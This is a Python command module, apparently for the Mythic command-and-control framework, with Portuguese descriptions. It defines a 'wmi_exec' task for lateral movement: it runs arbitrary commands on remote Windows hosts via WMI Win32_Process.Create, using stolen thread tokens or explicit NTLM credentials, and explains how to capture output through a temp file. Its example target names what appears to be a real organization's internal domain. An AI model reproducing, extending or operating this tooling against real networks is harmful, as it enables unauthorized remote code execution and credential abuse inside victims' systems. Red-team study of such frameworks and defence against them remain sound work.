from mythic_container.MythicCommandBase import *
import json
from mythic_container.MythicRPC import *


class WmiExecArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="target",
                type=ParameterType.String,
                parameter_group_info=[ParameterGroupInfo(required=True)],
                description="IP ou hostname do alvo (ex: 10.12.193.4 ou PC01.copel.nt)",
            ),
            CommandParameter(
                name="command",
                type=ParameterType.String,
                parameter_group_info=[ParameterGroupInfo(required=True)],
                description=(
                    "Comando a executar no alvo via Win32_Process.Create. "
                    "Para capturar output: 'cmd /c whoami > C:\\Windows\\Temp\\o.txt 2>&1'"
                ),
            ),
            CommandParameter(
                name="username",
                type=ParameterType.String,
                parameter_group_info=[ParameterGroupInfo(required=False)],
                description=(
                    "Usuário para autenticação explícita (formato: DOMAIN\\user). "
                    "Vazio = usa token do thread atual (token_steal já aplicado)."
                ),
                default_value="",
            ),
            CommandParameter(
                name="password",
                type=ParameterType.String,
                parameter_group_info=[ParameterGroupInfo(required=False)],
                description="Senha para autenticação explícita. Vazio = usa token atual.",
                default_value="",
            ),
        ]

    async def parse_arguments(self):
        if self.command_line:
            if self.command_line.strip().startswith('{'):
                d = json.loads(self.command_line)
                self.add_arg("target",   d.get("target", ""))
                self.add_arg("command",  d.get("command", ""))
                self.add_arg("username", d.get("username", ""))
                self.add_arg("password", d.get("password", ""))
            else:
                # Formato posicional: <target> <command>
                parts = self.command_line.strip().split(" ", 1)
                self.add_arg("target",   parts[0] if parts else "")
                self.add_arg("command",  parts[1] if len(parts) > 1 else "")
                self.add_arg("username", "")
                self.add_arg("password", "")
        else:
            self.add_arg("target",   "")
            self.add_arg("command",  "")
            self.add_arg("username", "")
            self.add_arg("password", "")


class WmiExecCommand(CommandBase):
    cmd         = "wmi_exec"
    needs_admin = False
    help_cmd    = "wmi_exec <target> <command>"
    description = (
        "Execução remota via WMI (T1047 / T1021.003).\n"
        "Usa Win32_Process.Create via COM/IWbemServices — sem wmic.exe.\n\n"
        "Modos de autenticação:\n"
        "  • Sem username/password → usa token do thread atual (aplique token_steal antes)\n"
        "  • Com username/password → autenticação NTLM explícita no namespace remoto\n\n"
        "O processo é criado de forma assíncrona (fire-and-forget). Para capturar\n"
        "output, redirecione stdout para arquivo e use download em seguida.\n\n"
        "Pré-requisito: acesso de rede à porta TCP/135 (RPC) e TCP/445 ou TCP dinâmico\n"
        "do alvo. WMI via firewall requer que o alvo tenha 'Windows Management\n"
        "Instrumentation' habilitado no firewall."
    )
    version               = 1
    author                = "@wtechsec"
    attackmapping         = ["T1047", "T1021.003"]
    supported_ui_features = []
    argument_class        = WmiExecArguments
    attributes            = CommandAttributes(
        supported_python_versions=["Python 3.8"],
        supported_os=[SupportedOS.Windows],
    )

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        target   = task.args.get_arg("target")   or ""
        command  = task.args.get_arg("command")  or ""
        username = task.args.get_arg("username") or ""

        if username:
            task.display_params = "target={} user={} cmd='{}'".format(
                target, username, command)
        else:
            task.display_params = "target={} cmd='{}' [token implícito]".format(
                target, command)
        return task

    async def process_response(
        self, task: PTTaskMessageAllData, response: any
    ) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
